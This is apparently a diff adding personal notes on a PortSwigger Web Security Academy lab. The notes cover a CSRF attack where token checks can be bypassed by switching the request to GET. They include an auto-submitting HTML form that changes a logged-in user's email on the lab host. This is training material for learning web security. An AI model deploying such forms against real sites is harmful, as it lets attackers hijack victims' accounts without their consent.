@@ -27,4 +27,29 @@ From <https://portswigger.net/web-security/csrf/lab-no-defenses>
         document.forms[0].submit();
 </script>
 ```
+**CSRF where token validation depends on request method**
+
+
+
+
+Intercept we notice a csrf token
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/c04ead97-a67a-46ac-9cec-52adef46971d)
+
+
+Remove csrf token we get a response that we need to change it
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6c89d56c-5b43-4c9b-a612-d9268239279b)
+
+
+
+Changine request to get and removing email change we can send it and get a 302 response
+"Follow redirection" we notice that we changed the email without a csrf token
+```
+<form action="https://0a05007c04bf708c81e28a7200120078.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="viet2@gmail.com">
+</form>
+<script>
+        document.forms[0].submit();
+</script>
+```
+
 
